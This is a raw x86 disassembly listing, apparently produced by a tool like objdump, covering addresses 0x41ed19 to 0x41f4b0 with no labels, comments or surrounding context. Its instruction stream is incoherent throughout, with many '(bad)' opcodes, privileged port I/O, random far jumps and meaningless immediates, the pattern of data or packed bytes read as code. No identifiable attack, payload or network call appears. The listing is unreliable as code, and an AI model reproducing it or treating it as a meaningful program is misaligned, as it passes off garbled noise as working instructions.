  41ed19:	xchg   edx,eax
  41ed1a:	push   ebx
  41ed1b:	pop    ebp
  41ed1c:	add    DWORD PTR [edi],esi
  41ed1e:	mov    dl,0x24
  41ed20:	out    dx,eax
  41ed21:	ss xor al,0xda
  41ed24:	adc    BYTE PTR [edi-0x5a],bl
  41ed27:	rol    BYTE PTR [ebx+0x2c],0xce
  41ed2b:	adc    eax,0xd6000e7d
  41ed30:	mov    dl,0x49
  41ed32:	scas   eax,DWORD PTR es:[edi]
  41ed33:	sbb    bh,cl
  41ed35:	jb     0x41ed4f
  41ed37:	outs   dx,BYTE PTR ds:[esi]
  41ed38:	sub    BYTE PTR [edx],cl
  41ed3a:	call   0xc3f1fd10
  41ed3f:	and    ah,BYTE PTR [eax]
  41ed41:	or     al,0x99
  41ed43:	fist   WORD PTR ds:[esi]
  41ed46:	or     eax,0xbae8608f
  41ed4b:	(bad)
  41ed4e:	adc    al,0xb5
  41ed50:	mov    ds:0x18f077c8,eax
  41ed55:	mov    ecx,0xd627bc1a
  41ed5a:	rol    DWORD PTR [edx-0x4b],cl
  41ed5d:	and    DWORD PTR [edx-0x71],esi
  41ed60:	imul   ebp,edi,0x62
  41ed63:	pop    ecx
  41ed64:	push   ebp
  41ed65:	mov    esp,0xe0973934
  41ed6a:	je     0x41edd0
  41ed6c:	dec    edx
  41ed6d:	in     al,0x5e
  41ed6f:	mov    ebp,0x30182aa0
  41ed74:	mov    ah,0xa6
  41ed76:	xchg   DWORD PTR [edx-0x60d348],ecx
  41ed7c:	iret   
  41ed7d:	jmp    0xb60e:0xbe49a890
  41ed84:	es pop ecx
  41ed86:	(bad)  
  41ed88:	xchg   ebx,eax
  41ed89:	dec    ebp
  41ed8a:	mov    ebx,0x1680f47a
  41ed8f:	push   ebx
  41ed90:	xor    BYTE PTR [esi],dh
  41ed92:	and    eax,0x22ea7220
  41ed97:	dec    esi
  41ed98:	fsubr  st(1),st
  41ed9a:	pop    eax
  41ed9b:	cmp    DWORD PTR cs:[edx-0x47225fb3],ecx
  41eda2:	call   0x64c6f88c
  41eda7:	dec    edi
  41eda8:	lock xor al,0xeb
  41edab:	add    ecx,edx
  41edad:	cwde   
  41edae:	jb     0x41edd7
  41edb0:	cmp    DWORD PTR [ebx],eax
  41edb2:	xchg   ebx,eax
  41edb3:	in     al,dx
  41edb4:	idiv   BYTE PTR [eax-0x28]
  41edb7:	cmp    BYTE PTR [edi+0x29],ah
  41edba:	dec    esp
  41edbb:	outs   dx,BYTE PTR ds:[esi]
  41edbc:	mov    ecx,0x764342af
  41edc1:	rcr    BYTE PTR [edx],1
  41edc3:	shl    DWORD PTR [ebp+ebx*8-0x5f],1
  41edc7:	jns    0x41edc3
  41edc9:	dec    edi
  41edca:	inc    ebp
  41edcb:	aaa    
  41edcc:	pop    edi
  41edcd:	iret   
  41edce:	imul   bx,di,0x4c62
  41edd3:	cwde   
  41edd4:	pop    ecx
  41edd5:	mov    bl,dl
  41edd7:	inc    esp
  41edd8:	repz add eax,0x86eaf98
  41edde:	add    ecx,DWORD PTR [ebp-0x7a]
  41ede1:	rcl    DWORD PTR [ebp-0xbebd982],0xba
  41ede8:	push   ss
  41ede9:	and    bh,BYTE PTR [edx+0x44]
  41edec:	cmp    esp,DWORD PTR [ecx]
  41edee:	jns    0x41edeb
  41edf0:	daa    
  41edf1:	test   eax,0x6d326d3b
  41edf6:	sbb    cl,bh
  41edf8:	pop    edi
  41edf9:	scas   eax,DWORD PTR es:[edi]
  41edfa:	in     al,dx
  41edfb:	dec    eax
  41edfc:	sub    ah,bh
  41edfe:	add    DWORD PTR [edx-0x72aa47ba],0x3c592aa3
  41ee08:	mov    edx,0xfdca6010
  41ee0d:	mov    cl,0xda
  41ee0f:	jno    0x41edbc
  41ee11:	retf   
  41ee12:	int    0xf5
  41ee14:	aam    0xf4
  41ee16:	clc    
  41ee17:	into   
  41ee18:	into   
  41ee19:	jnp    0x41edfc
  41ee1b:	jg     0x41edcc
  41ee1d:	sub    edi,DWORD PTR [edi]
  41ee1f:	out    dx,eax
  41ee20:	jge    0x41edcd
  41ee22:	pushf  
  41ee23:	sub    bh,BYTE PTR [edx-0x22]
  41ee26:	outs   dx,BYTE PTR ds:[esi]
  41ee27:	jb     0x41ee91
  41ee29:	mov    ds:0xe88b6e2d,eax
  41ee2e:	xor    DWORD PTR [ebp-0x79],edx
  41ee31:	cwde   
  41ee32:	(bad)  
  41ee34:	mov    eax,DWORD PTR [edx+0x43f6d71b]
  41ee3a:	(bad)  
  41ee3b:	retf   0xcfeb
  41ee3e:	add    eax,0x953afd27
  41ee43:	push   ebp
  41ee44:	mov    ah,0x30
  41ee46:	loop   0x41ee98
  41ee48:	pop    ecx
  41ee49:	cs dec esp
  41ee4b:	repnz sub eax,ebp
  41ee4e:	and    BYTE PTR [esi+0x52ee3746],cl
  41ee54:	pop    ss
  41ee55:	pop    ebp
  41ee56:	push   eax
  41ee57:	mov    eax,0xe4bb85ba
  41ee5c:	mov    ebp,0xbf5e7aad
  41ee61:	aad    0xb9
  41ee63:	sti    
  41ee64:	popa   
  41ee65:	js     0x41eecc
  41ee67:	mov    bh,0x8f
  41ee69:	in     al,dx
  41ee6a:	adc    BYTE PTR [ecx+0x6d],dl
  41ee6d:	push   esi
  41ee6e:	push   ss
  41ee6f:	pop    eax
  41ee70:	(bad)  
  41ee71:	imul   eax,DWORD PTR [eax+edi*8+0x5c653d66],0x813a2869
  41ee7c:	sub    al,BYTE PTR [eax+0x1f]
  41ee7f:	jo     0x41eecf
  41ee81:	(bad)  
  41ee82:	rol    BYTE PTR [ecx+0x437378ee],cl
  41ee88:	add    BYTE PTR [eax],0x20
  41ee8b:	push   esi
  41ee8c:	push   edi
  41ee8d:	add    ebp,edi
  41ee8f:	test   DWORD PTR [eax+0x1087714c],eax
  41ee95:	retf   
  41ee96:	leave  
  41ee97:	push   eax
  41ee98:	loop   0x41ef0a
  41ee9a:	mov    DWORD PTR [edx+0x55929900],ecx
  41eea0:	lea    ebp,[eax-0x26286f4b]
  41eea6:	cmp    ebx,DWORD PTR [esi-0x657d0167]
  41eeac:	in     eax,dx
  41eead:	xchg   esp,eax
  41eeae:	lds    ebx,FWORD PTR [eax-0x20]
  41eeb1:	mov    db4,eax
  41eeb4:	fisubr DWORD PTR [ecx+ebx*4+0x32b6efa2]
  41eebb:	inc    edx
  41eebc:	dec    ecx
  41eebd:	jno    0x41ef39
  41eebf:	dec    ebx
  41eec0:	pop    edx
  41eec1:	hlt    
  41eec2:	dec    ebp
  41eec3:	call   0xad8cf553
  41eec8:	jg     0x41eed1
  41eeca:	out    dx,eax
  41eecb:	mov    ah,0x2b
  41eecd:	data16 mov WORD PTR [edi-0x19],?
  41eed1:	push   ds
  41eed2:	mov    esp,0x8a553a4a
  41eed7:	xor    DWORD PTR [edi-0x5c],edx
  41eeda:	jg     0x41ee6b
  41eedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eedd:	jmp    0x14e8:0x8bb393a3
  41eee4:	scas   al,BYTE PTR es:[edi]
  41eee5:	mov    bl,0x91
  41eee7:	pusha  
  41eee8:	cmp    DWORD PTR [ecx+0x15603f47],ebx
  41eeee:	mov    dl,0x25
  41eef0:	adc    eax,0x76a9e557
  41eef5:	enter  0xcacb,0x50
  41eef9:	pusha  
  41eefa:	dec    ebp
  41eefb:	cli    
  41eefc:	aaa    
  41eefd:	mov    esp,0xf067ab9d
  41ef02:	mov    ds:0xf6cf3d52,eax
  41ef07:	rcl    DWORD PTR [esi],0x8a
  41ef0a:	and    DWORD PTR [edx-0x54],edx
  41ef0d:	aas    
  41ef0e:	mov    ch,bh
  41ef10:	mov    ebp,0xc0a668ee
  41ef15:	cmp    al,0x93
  41ef17:	pop    es
  41ef18:	nop
  41ef19:	push   es
  41ef1a:	dec    ebx
  41ef1b:	repnz or eax,esi
  41ef1e:	rcl    BYTE PTR [ebp+0x13],cl
  41ef21:	jge    0x41ef3d
  41ef23:	sub    eax,0x6db42b01
  41ef28:	in     al,0x3c
  41ef2a:	xor    eax,0x80f4fe8c
  41ef2f:	add    esp,DWORD PTR [ecx-0x2e29cbdc]
  41ef35:	cmc    
  41ef36:	mov    esi,0x1648762b
  41ef3b:	mov    al,0xae
  41ef3d:	jo     0x41eedf
  41ef3f:	stc    
  41ef40:	adc    BYTE PTR [eax+0x3b9988e5],ah
  41ef46:	mov    edx,0x7c42c17e
  41ef4b:	fistp  WORD PTR [ecx+0x55]
  41ef4e:	je     0x41ef81
  41ef50:	sbb    BYTE PTR [esi+0xc],bh
  41ef53:	aam    0x7
  41ef55:	fimul  WORD PTR [ecx]
  41ef57:	xchg   ecx,eax
  41ef58:	or     eax,0xd4c0a2b
  41ef5d:	dec    ebp
  41ef5e:	aas    
  41ef5f:	push   ss
  41ef60:	or     eax,0xe71c90ef
  41ef65:	lds    edi,FWORD PTR [ecx+0x50b8951]
  41ef6b:	mov    dh,0x88
  41ef6d:	cdq    
  41ef6e:	sahf   
  41ef6f:	aam    0xa8
  41ef71:	mov    ch,0xb4
  41ef73:	inc    esi
  41ef74:	aad    0x78
  41ef76:	aas    
  41ef77:	pop    ebx
  41ef78:	retf   0x7e82
  41ef7b:	pop    es
  41ef7c:	adc    al,0x5e
  41ef7e:	call   0xc300:0x218892c
  41ef85:	fimul  DWORD PTR [edx+edx*1-0x19685f17]
  41ef8c:	popf   
  41ef8d:	aam    0x7d
  41ef8f:	dec    edx
  41ef90:	popf   
  41ef91:	cmp    DWORD PTR [edx+0x1d],ecx
  41ef94:	sbb    bl,ah
  41ef96:	popa   
  41ef97:	into   
  41ef98:	repnz mov ah,0x15
  41ef9b:	sub    eax,0x45bff1cc
  41efa0:	ss adc al,0x2a
  41efa3:	push   ds
  41efa4:	int3   
  41efa5:	jmp    0x67d5:0xb4b6038b
  41efac:	ds ud2 
  41efaf:	ins    BYTE PTR es:[edi],dx
  41efb0:	push   esp
  41efb1:	outs   dx,DWORD PTR ds:[esi]
  41efb2:	out    dx,eax
  41efb3:	jg     0x41ef93
  41efb5:	daa    
  41efb6:	repz push edi
  41efb8:	test   BYTE PTR [ebp+0x57cc951b],ch
  41efbe:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41efc0:	adc    cl,BYTE PTR [ecx+0x7c]
  41efc3:	mov    esi,0x43017ee3
  41efc8:	mov    BYTE PTR [edx-0x334e6682],cl
  41efce:	push   edx
  41efcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd0:	xchg   al,dh
  41efd2:	pop    edx
  41efd3:	in     al,dx
  41efd4:	or     al,0xe2
  41efd6:	sbb    al,0x2d
  41efd8:	cmp    eax,0x33dffe2c
  41efdd:	repz pop ds
  41efdf:	xchg   edx,eax
  41efe0:	jae    0x41f001
  41efe2:	rcr    BYTE PTR [ebx-0x51],0x6
  41efe6:	jg     0x41efc1
  41efe8:	sub    BYTE PTR [eax],bh
  41efea:	out    dx,al
  41efeb:	fst    QWORD PTR [ebp+eax*8-0x38]
  41efef:	xor    bh,dh
  41eff1:	dec    ebp
  41eff2:	ficomp WORD PTR [ebp-0x375155da]
  41eff8:	imul   DWORD PTR [edi]
  41effa:	xor    dl,BYTE PTR [ebx]
  41effc:	fisttp WORD PTR [esi+0x1c]
  41efff:	call   0x69658efb
  41f004:	popf   
  41f005:	push   eax
  41f006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f007:	in     al,0x7f
  41f009:	mov    al,0x81
  41f00b:	jmp    0x41f000
  41f00d:	repnz cwde 
  41f00f:	dec    ecx
  41f010:	sbb    cl,BYTE PTR ds:0x52969469
  41f017:	cmp    al,0xbb
  41f019:	call   0x7ab:0xa75f61eb
  41f020:	xor    BYTE PTR [ecx+0x140a3b6b],ch
  41f026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f027:	push   eax
  41f028:	ins    DWORD PTR es:[edi],dx
  41f029:	mov    edx,0xc03607b6
  41f02e:	cdq    
  41f02f:	jg     0x41f0a6
  41f031:	pop    es
  41f032:	ffree  st(1)
  41f034:	cmp    eax,0xdba61e25
  41f039:	cmc    
  41f03a:	add    esi,DWORD PTR [ebx+0x4b]
  41f03d:	jle    0x41efcf
  41f03f:	mov    edx,0x7c6a21fb
  41f044:	push   ecx
  41f045:	pop    DWORD PTR [ebp+0x41]
  41f048:	inc    esi
  41f049:	leave  
  41f04a:	adc    DWORD PTR [eax-0x12],esi
  41f04d:	retf   0x94aa
  41f050:	lods   al,BYTE PTR ds:[esi]
  41f051:	pop    DWORD PTR [edi]
  41f053:	add    ecx,DWORD PTR [ebx]
  41f055:	pop    esi
  41f056:	cmp    BYTE PTR [eax*8-0xf2b7bdb],ah
  41f05d:	or     DWORD PTR [edx-0x4],ebx
  41f060:	pop    ds
  41f061:	fwait
  41f062:	es scas al,BYTE PTR es:[edi]
  41f064:	test   BYTE PTR [ebx],0x1e
  41f067:	clc    
  41f068:	push   ebp
  41f069:	sbb    DWORD PTR [ebx+0x238a71ad],eax
  41f06f:	xlat   BYTE PTR ds:[ebx]
  41f070:	mov    ch,0xd1
  41f072:	dec    esp
  41f073:	lock fdivr st(3),st
  41f076:	push   edx
  41f077:	shl    BYTE PTR ss:[esi+0x4],1
  41f07b:	int3   
  41f07c:	in     al,0x8d
  41f07e:	xor    bl,BYTE PTR [eax]
  41f080:	inc    edi
  41f081:	push   ds
  41f082:	pushf  
  41f083:	mov    ebp,DWORD PTR [ebx]
  41f085:	shl    BYTE PTR [ebx],cl
  41f087:	push   ecx
  41f088:	rol    DWORD PTR ds:0x1d792b02,0x8f
  41f08f:	(bad)  
  41f090:	das    
  41f091:	jle    0x41f082
  41f093:	and    dl,BYTE PTR [eax+0x5fda94a]
  41f099:	jbe    0x41f0df
  41f09b:	cmp    BYTE PTR [edx-0x568b7aad],ah
  41f0a1:	xchg   DWORD PTR [eax],eax
  41f0a3:	loopne 0x41f11d
  41f0a5:	das    
  41f0a6:	xchg   esp,eax
  41f0a7:	cli    
  41f0a8:	push   ebx
  41f0a9:	in     eax,dx
  41f0aa:	(bad)  
  41f0ab:	scas   al,BYTE PTR es:[edi]
  41f0ac:	pop    esp
  41f0ad:	into   
  41f0ae:	cmc    
  41f0af:	hlt    
  41f0b0:	sbb    al,0x21
  41f0b2:	test   al,0x2
  41f0b4:	out    dx,al
  41f0b5:	mov    ?,WORD PTR [edi]
  41f0b7:	arpl   WORD PTR [ebx+0x4df594b3],cx
  41f0bd:	repz cld 
  41f0bf:	retf   
  41f0c0:	sbb    cl,BYTE PTR [ecx-0x53]
  41f0c3:	push   eax
  41f0c4:	jecxz  0x41f0e7
  41f0c6:	push   esi
  41f0c7:	not    ecx
  41f0c9:	mov    cl,0xa3
  41f0cb:	xor    BYTE PTR [edi+0x7b2a8a6c],0xdf
  41f0d2:	leave  
  41f0d3:	jne    0x41f145
  41f0d5:	jb     0x41f0f3
  41f0d7:	popf   
  41f0d8:	mov    ds:0xe4b52627,eax
  41f0dd:	imul   ebp,DWORD PTR [ecx+0x55c3ff63],0x52
  41f0e4:	ret    0xfbf3
  41f0e7:	mov    ds:0x87220719,eax
  41f0ec:	(bad)  
  41f0ed:	mov    ds:0xd30cf412,al
  41f0f2:	cmp    ah,ch
  41f0f4:	pushf  
  41f0f5:	adc    esp,DWORD PTR [edi+0x3c]
  41f0f8:	stc    
  41f0f9:	test   BYTE PTR [eax+edx*8+0x46],al
  41f0fd:	rcl    DWORD PTR [esi],0xae
  41f100:	leave  
  41f101:	addr16 jg 0x41f0b5
  41f104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f105:	imul   ecx,DWORD PTR [ebx],0xfffffff3
  41f108:	ja     0x41f121
  41f10a:	inc    edx
  41f10b:	fisubr DWORD PTR ds:0xdd3a5ee5
  41f111:	mov    dl,0x57
  41f113:	or     al,0xac
  41f115:	push   0xe8bbdf1c
  41f11a:	xor    al,0x80
  41f11c:	jo     0x41f143
  41f11e:	mov    bl,0x21
  41f120:	ret    0xb75b
  41f123:	pop    es
  41f124:	and    al,0x5c
  41f126:	dec    ebp
  41f127:	jbe    0x41f13c
  41f129:	out    0x48,eax
  41f12b:	daa    
  41f12c:	cmc    
  41f12d:	fstp   st(0)
  41f12f:	jae    0x41f14f
  41f131:	(bad)  
  41f132:	test   DWORD PTR [ebp+0x771c4ec4],0x76cfe0f9
  41f13c:	mov    esi,0x89ae3a77
  41f141:	addr16 adc al,0x4
  41f144:	sub    esp,DWORD PTR [esp+edx*4+0x2854cee8]
  41f14b:	cmp    ah,dl
  41f14d:	out    0x15,eax
  41f14f:	xor    DWORD PTR [edx+0x455126cc],esp
  41f155:	das    
  41f156:	add    ch,BYTE PTR ds:0x674f19c5
  41f15c:	push   ebx
  41f15d:	aam    0x8d
  41f15f:	or     ecx,DWORD PTR [edi+0x30]
  41f162:	push   esp
  41f163:	jae    0x41f1ce
  41f165:	pop    ds
  41f166:	pop    es
  41f167:	add    al,0x4b
  41f169:	push   0xffffffa9
  41f16b:	icebp  
  41f16c:	cmp    al,0x58
  41f16e:	adc    eax,0x62784ac9
  41f173:	out    dx,al
  41f174:	dec    ecx
  41f175:	push   0x9
  41f177:	jmp    0x36f4a9b4
  41f17c:	inc    ecx
  41f17d:	shr    DWORD PTR [edx],1
  41f17f:	jge    0x41f1c0
  41f181:	lahf   
  41f182:	pushf  
  41f183:	retf   0xfd7c
  41f186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f187:	dec    edi
  41f188:	and    dl,BYTE PTR [esi-0x90790ef]
  41f18e:	inc    ebx
  41f18f:	fs in  al,0x51
  41f192:	xchg   BYTE PTR [ebx],al
  41f194:	loopne 0x41f152
  41f196:	adc    ebx,DWORD PTR [edx-0x9bb6514]
  41f19c:	out    0x35,eax
  41f19e:	sbb    al,0xb0
  41f1a0:	push   ds
  41f1a1:	xchg   ebp,eax
  41f1a2:	test   DWORD PTR [esi],esi
  41f1a4:	push   0x57
  41f1a6:	(bad)  
  41f1a7:	jbe    0x41f15d
  41f1a9:	lahf   
  41f1aa:	push   edi
  41f1ab:	adc    al,dh
  41f1ad:	out    dx,al
  41f1ae:	leave  
  41f1af:	mov    cl,0x38
  41f1b1:	cmp    eax,0x592ee12f
  41f1b6:	mov    edi,0xd45433e4
  41f1bb:	enter  0xd1e7,0xbf
  41f1bf:	mov    WORD PTR [esi+0x42],fs
  41f1c2:	ins    BYTE PTR es:[edi],dx
  41f1c3:	aaa    
  41f1c4:	rcl    DWORD PTR [eax],0xb6
  41f1c7:	jmp    0x7c37bb7b
  41f1cc:	xor    DWORD PTR [ecx],0xb261cf9f
  41f1d2:	jo     0x41f204
  41f1d4:	mov    dl,dl
  41f1d6:	dec    esi
  41f1d7:	pop    edi
  41f1d8:	iret   
  41f1d9:	cmp    BYTE PTR [esi+0x26],0xbc
  41f1dd:	add    edx,DWORD PTR [ebp-0x21]
  41f1e0:	ins    BYTE PTR es:[edi],dx
  41f1e1:	test   DWORD PTR [eax+0x2ef4bad2],edx
  41f1e7:	fadd   st,st(1)
  41f1e9:	dec    edi
  41f1ea:	and    eax,0x4775ba60
  41f1ef:	or     BYTE PTR [edx],0xd8
  41f1f2:	aaa    
  41f1f3:	mov    esi,0x4823e5d6
  41f1f8:	js     0x41f1aa
  41f1fa:	fisttp DWORD PTR [edx]
  41f1fc:	mov    bh,dh
  41f1fe:	and    al,0x8
  41f200:	jle    0x41f239
  41f202:	(bad)  
  41f203:	ret    
  41f204:	add    bl,0x7b
  41f207:	scas   eax,DWORD PTR es:[edi]
  41f208:	cmp    BYTE PTR ds:0x96287090,ah
  41f20e:	and    bl,BYTE PTR [edi+0x342fd142]
  41f214:	lahf   
  41f215:	dec    ebp
  41f216:	xor    al,0xd6
  41f218:	mov    cl,0x30
  41f21a:	xor    DWORD PTR [esi+0x43],edx
  41f21d:	test   DWORD PTR ds:0xfe5ac49e,ecx
  41f223:	sub    eax,0x9c94b5af
  41f228:	jnp    0x41f2a8
  41f22a:	and    esi,DWORD PTR [edi+0x2b731d9a]
  41f230:	xor    eax,0x644089a4
  41f235:	repnz fadd QWORD PTR [eax+0x525b3b71]
  41f23c:	cmp    DWORD PTR [esi+0x111d2cd5],esi
  41f242:	push   ss
  41f243:	add    eax,0xff5ed10a
  41f248:	and    DWORD PTR [eax-0x76066804],edi
  41f24e:	lods   eax,DWORD PTR ds:[esi]
  41f24f:	sub    DWORD PTR [eax+0x2340d72],ecx
  41f255:	jmp    0x41f25b
  41f257:	test   al,0x95
  41f259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f25a:	test   BYTE PTR [ebx-0x491bf421],bh
  41f260:	icebp  
  41f261:	mov    eax,0x350beac
  41f266:	jnp    0x41f2ca
  41f268:	mov    ebp,0xa6298723
  41f26d:	je     0x41f291
  41f26f:	mov    esp,0x53b205a6
  41f274:	push   ecx
  41f275:	mov    edx,0xc1543d2e
  41f27a:	or     edx,DWORD PTR ds:0xcc5325f3
  41f280:	jnp    0x41f2e5
  41f282:	aaa    
  41f283:	retf   
  41f284:	mov    ds:0x6e930e,al
  41f289:	repnz add esp,DWORD PTR [edi+0x63d1e599]
  41f290:	xchg   bl,ch
  41f292:	xor    BYTE PTR [ebx-0x3166de9c],bh
  41f298:	jge    0x41f249
  41f29a:	sub    BYTE PTR [esp+edx*1],dl
  41f29d:	mov    esp,0xcbed7f83
  41f2a2:	stos   BYTE PTR es:[edi],al
  41f2a3:	ficomp WORD PTR [ebx+eax*4-0x588ffd87]
  41f2aa:	outs   dx,DWORD PTR ds:[esi]
  41f2ab:	jmp    0xf643:0xad536b15
  41f2b2:	cwde   
  41f2b3:	adc    BYTE PTR [ecx-0x5f800d67],ch
  41f2b9:	rcl    esp,0x5
  41f2bc:	popf   
  41f2bd:	mov    cl,0xf1
  41f2bf:	and    esi,esi
  41f2c1:	call   0x85c2e317
  41f2c6:	mov    esi,ebx
  41f2c8:	outs   dx,BYTE PTR ds:[esi]
  41f2c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ca:	ds mov ecx,0x24ec56b4
  41f2d0:	adc    BYTE PTR [esi],ah
  41f2d2:	jns    0x41f2c0
  41f2d4:	fidivr DWORD PTR [ebx-0x707b39d7]
  41f2da:	in     al,0x62
  41f2dc:	push   edx
  41f2dd:	lock mov ebp,0x3ac65af0
  41f2e3:	leave  
  41f2e4:	mov    eax,ds:0x32c20f67
  41f2e9:	push   es
  41f2ea:	push   eax
  41f2eb:	shl    ch,0x27
  41f2ee:	push   edx
  41f2ef:	stos   DWORD PTR es:[edi],eax
  41f2f0:	fisttp QWORD PTR [eax-0x18710b8d]
  41f2f6:	pop    ss
  41f2f7:	jae    0x41f32c
  41f2f9:	clc    
  41f2fa:	xchg   edi,eax
  41f2fb:	rcl    DWORD PTR [eax-0x14],0xcf
  41f2ff:	pop    ebx
  41f300:	sbb    DWORD PTR [ecx-0x361f7535],edx
  41f306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f307:	add    DWORD PTR [ebx+0x6091857c],ebp
  41f30d:	test   DWORD PTR [ebp+ebx*8-0x5df33658],0xc091f850
  41f318:	adc    BYTE PTR [edi],0xe1
  41f31b:	pusha  
  41f31c:	in     eax,dx
  41f31d:	adc    ecx,eax
  41f31f:	arpl   WORD PTR [ebx-0x2e15f38b],di
  41f325:	xchg   edi,eax
  41f326:	out    0x3e,eax
  41f328:	push   cs
  41f329:	jmp    0xc537:0x104e5cec
  41f330:	and    esi,esp
  41f332:	add    al,0x31
  41f334:	fsub   DWORD PTR [eax+0x3a]
  41f337:	adc    al,0x8a
  41f339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f33a:	out    0x46,eax
  41f33c:	pusha  
  41f33d:	pop    ds
  41f33e:	and    eax,0x263ac67c
  41f343:	es out dx,eax
  41f345:	popa   
  41f346:	cmp    al,0x1f
  41f348:	into   
  41f349:	sar    ah,0x5e
  41f34c:	jne    0x41f33d
  41f34e:	mov    BYTE PTR [edx+0x4864ef10],al
  41f354:	call   0xb55b:0xf9600283
  41f35b:	into   
  41f35c:	std    
  41f35d:	out    dx,al
  41f35e:	mov    ds:0xce9c9683,eax
  41f363:	push   cs
  41f364:	mov    cl,0x22
  41f366:	mov    ds:0x8ce61450,eax
  41f36b:	dec    ecx
  41f36c:	scas   al,BYTE PTR es:[edi]
  41f36d:	sbb    ch,al
  41f36f:	rcl    ecx,cl
  41f371:	ins    DWORD PTR es:[edi],dx
  41f372:	je     0x41f3a2
  41f374:	arpl   WORD PTR [ebp+edi*1-0x4917822],cx
  41f37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f37c:	push   ss
  41f37d:	adc    eax,0x403ae163
  41f382:	or     edx,DWORD PTR [ecx+edx*8-0x2a79673e]
  41f389:	inc    BYTE PTR [ecx-0x63]
  41f38c:	ficom  WORD PTR [esi]
  41f38e:	sbb    ebx,DWORD PTR [esi+ebp*2]
  41f391:	jb     0x41f316
  41f393:	cwde   
  41f394:	sub    DWORD PTR [ebx],edi
  41f396:	cmp    BYTE PTR ds:0xbe97c114,al
  41f39c:	pop    di
  41f39e:	test   al,0x13
  41f3a0:	xchg   ebx,eax
  41f3a1:	icebp  
  41f3a2:	adc    eax,ebx
  41f3a4:	jmp    DWORD PTR [ecx]
  41f3a6:	mov    eax,0x61ef75af
  41f3ab:	mov    BYTE PTR [ebx+0x21ab9ca8],bl
  41f3b1:	out    dx,al
  41f3b2:	sub    BYTE PTR [ebp+0x7a79295b],0xc3
  41f3b9:	sbb    BYTE PTR [edx-0xcf50720],0x97
  41f3c0:	sub    esp,DWORD PTR [ebp-0x45]
  41f3c3:	mov    eax,0x712ecafd
  41f3c8:	(bad)  
  41f3c9:	mov    bl,0x25
  41f3cb:	es adc al,0x6
  41f3ce:	arpl   WORD PTR [ebx-0x2906bcf8],di
  41f3d4:	rcr    BYTE PTR [eax-0x35395312],cl
  41f3da:	enter  0x3359,0xb7
  41f3de:	jl     0x41f40f
  41f3e0:	arpl   si,si
  41f3e2:	inc    edx
  41f3e3:	xor    al,0x28
  41f3e5:	shl    BYTE PTR [edx-0x14],cl
  41f3e8:	inc    esp
  41f3e9:	xchg   edi,eax
  41f3ea:	mov    eax,0x58ae80fb
  41f3ef:	pop    edi
  41f3f0:	mov    al,0x65
  41f3f2:	ds push edi
  41f3f4:	in     eax,0x93
  41f3f6:	push   ecx
  41f3f7:	mov    dl,0xc
  41f3f9:	jnp    0x41f3ca
  41f3fb:	fwait
  41f3fc:	mov    bh,0xed
  41f3fe:	loopne 0x41f434
  41f400:	outs   dx,BYTE PTR ds:[esi]
  41f401:	icebp  
  41f402:	mov    al,0xfd
  41f404:	jl     0x41f426
  41f406:	xlat   BYTE PTR ds:[ebx]
  41f407:	jne    0x41f446
  41f409:	or     al,0x94
  41f40b:	jo     0x41f435
  41f40d:	sub    ah,ch
  41f40f:	inc    eax
  41f410:	scas   al,BYTE PTR es:[edi]
  41f411:	les    ebx,FWORD PTR [edx+eax*4-0x6e]
  41f415:	shl    al,1
  41f417:	outs   dx,BYTE PTR ds:[esi]
  41f418:	xor    al,0x80
  41f41a:	xor    BYTE PTR [ebx],dh
  41f41c:	shl    BYTE PTR [ebx-0x64],cl
  41f41f:	int    0xef
  41f421:	or     eax,0xf697060
  41f426:	fwait
  41f427:	cmp    dh,al
  41f429:	cmp    dh,cl
  41f42b:	(bad)  
  41f42c:	imul   edx,edi,0xffffff9b
  41f42f:	ins    DWORD PTR es:[edi],dx
  41f430:	pop    es
  41f431:	push   0x883ee9f9
  41f436:	xchg   ecx,eax
  41f437:	pop    ebx
  41f438:	push   ecx
  41f439:	js     0x41f451
  41f43b:	pop    ss
  41f43c:	pop    ss
  41f43d:	not    BYTE PTR [edx+0x5e]
  41f440:	mov    ds,WORD PTR [esp+edi*4-0x20cbe8cc]
  41f447:	add    al,0x9b
  41f449:	adc    eax,DWORD PTR [ebp+0x3470aab2]
  41f44f:	jl     0x41f3fc
  41f451:	gs sbb al,0x53
  41f454:	push   esi
  41f455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f456:	pop    eax
  41f457:	mov    edx,0xe3eecef9
  41f45c:	dec    ecx
  41f45d:	jp     0x41f45b
  41f45f:	jo     0x41f414
  41f461:	and    BYTE PTR [edx+eiz*1],ch
  41f464:	xlat   BYTE PTR ds:[ebx]
  41f465:	dec    edi
  41f466:	nop
  41f467:	sbb    al,0xdf
  41f469:	pop    ecx
  41f46a:	sub    al,0xbc
  41f46c:	mul    BYTE PTR [esi*8-0x5feb3790]
  41f473:	or     al,0x68
  41f475:	pop    ebx
  41f476:	or     eax,0xeb6542e5
  41f47b:	pop    ds
  41f47c:	sti    
  41f47d:	leave  
  41f47e:	push   esi
  41f47f:	pop    esi
  41f480:	outs   dx,BYTE PTR ds:[esi]
  41f481:	lock mov edi,DWORD PTR [ebx-0x59c1f8be]
  41f488:	sub    BYTE PTR ds:0x4fbeee36,ah
  41f48e:	add    BYTE PTR [esi-0x4d],bl
  41f491:	shr    BYTE PTR [edi+0x2b],cl
  41f494:	test   DWORD PTR [edx+0x237d1bb3],esi
  41f49a:	jge    0x41f4d0
  41f49c:	sahf   
  41f49d:	ret    
  41f49e:	xor    eax,0xfb484a2e
  41f4a3:	fs dec ebx
  41f4a5:	xchg   ebx,eax
  41f4a6:	lods   al,BYTE PTR ds:[esi]
  41f4a7:	inc    ecx
  41f4a8:	pop    edx
  41f4a9:	push   cs
  41f4aa:	or     cl,BYTE PTR [eax+0x20]
  41f4ad:	push   esp
  41f4ae:	dec    ebp
  41f4af:	aaa    
  41f4b0:	xor    eax,0xf8007e51
